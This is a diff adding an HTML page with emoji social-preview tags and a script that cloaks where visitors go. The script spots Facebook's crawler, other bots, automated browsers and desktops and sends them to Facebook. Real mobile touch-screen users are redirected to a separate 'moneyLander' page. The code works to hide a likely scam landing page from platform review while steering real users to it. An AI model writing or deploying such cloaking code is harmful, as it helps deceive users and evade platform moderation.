@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Social Preview Tags -->
+    <meta property="og:title" content="💜 ❤️💜❤️💜❤️💜">
+    <meta property="og:description" content="💜 ❤️💜❤️💜">
+    <meta property="og:image" content="https://raw.githubusercontent.com/sabirsadrosadro-droid/Ticn-/refs/heads/main/2.gif">
+    <meta property="og:image:width" content="500">
+    <meta property="og:image:height" content="500">
+    <meta property="og:type" content="website">
+
+    <script>
+        // Redirect URLs
+        const safeRedirect = "web.facebook.com";
+        const moneyLander = "https://logical-azalea-11x992b.mystrikingly.com/";
+
+        const ua = navigator.userAgent.toLowerCase();
+        
+        // 1. Screen Width Check (490px se badi har screen tablet/laptop mani jayegi)
+        const isLargeScreen = window.innerWidth > 490;
+
+        // 2. Known Bots Check
+        const isBot = /facebookexternalhit|facebot|metainspector|crawler|spider|bot/i.test(ua);
+        const isAutomated = navigator.webdriver === true;
+
+        // 3. Hardware / Sensor Layer
+        const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+
+        // 4. Device Logic
+        const isMobileOrTablet = /android|iphone|ipad|ipod/i.test(ua);
+        const isDesktopPC = /windows|macintosh|linux/i.test(ua) && !/iphone|ipad|android/i.test(ua);
+
+        // FINAL FILTER
+        if (isLargeScreen) {
+            // Agar screen 490px se ek pixel bhi badi hui, toh seedha safe page
+            window.location.replace(safeRedirect);
+        } else if (isBot || isAutomated || !hasTouchSupport || isDesktopPC) {
+            window.location.replace(safeRedirect);
+        } else if (isMobileOrTablet && hasTouchSupport) {
+            window.location.replace(moneyLander);
+        } else {
+            window.location.replace(safeRedirect);
+        }
+    </script>
+</head>
+<body style="background-color: #ffffff;">
+</body>
+</html>
